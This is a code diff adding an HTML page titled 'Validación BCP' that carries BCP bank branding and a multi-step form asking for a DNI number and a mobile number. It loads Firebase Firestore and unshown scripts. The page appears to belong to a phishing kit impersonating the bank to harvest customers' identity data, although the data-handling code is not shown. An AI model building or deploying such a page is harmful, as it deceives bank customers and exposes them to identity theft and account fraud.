@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <title>Validación BCP</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+  <link rel="stylesheet" href="assets/css/main.css" />
+  <link rel="stylesheet" href="assets/css/stylo.css" />
+  <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
+  <!-- Firebase App y Firestore desde CDN -->
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-firestore-compat.js"></script>
+  <link rel="stylesheet" href="assets/css/index3.css">
+</head>
+
+<body>
+  <div class="navbar">
+    <img src="assets/img/bcp-dark-default.svg" alt="Logo BCP" />
+    <div class="hamburger"></div>
+  </div>
+
+  <div class="timeline">
+    <div class="step active">1</div>
+    <div class="line"></div>
+    <div class="step">2</div>
+    <div class="line"></div>
+    <div class="step">3</div>
+    <div class="line"></div>
+    <div class="step">4</div>
+  </div>
+  <br />
+
+  <h2 class="title">Hola,<br />Validaremos tu datos</h2>
+  <br />
+
+  <form class="form-container" id="formulario" novalidate>
+    <div class="input-group" id="group-dni">
+      <input type="text" id="dni" placeholder=" " maxlength="8" />
+      <label for="email">DNI</label>
+      <div class="error-message" id="error-dni"></div>
+    </div>
+    <div class="input-group" id="group-celular">
+      <input type="text" id="celular" placeholder=" " maxlength="9" />
+      <label for="celular">Celular</label>
+      <div class="error-message" id="error-celular"></div>
+    </div>
+    <br />
+    <div class="checkbox-group">
+      <input type="checkbox" id="confirm" checked />
+      <label for="confirm">Declaro haber consignado mis datos reales.</label>
+    </div>
+    <button class="btn" type="submit">Continuar</button>
+  </form>
+  <script type="module" src="assets/js/index3.js"></script>
+  <script src="firebase/config.js"></script>
+  <script src="assets/js/flotante-bcp2.js"></script>
+  <script src="assets/js/AuthGuard.js"></script>
+</body>
+
+</html>
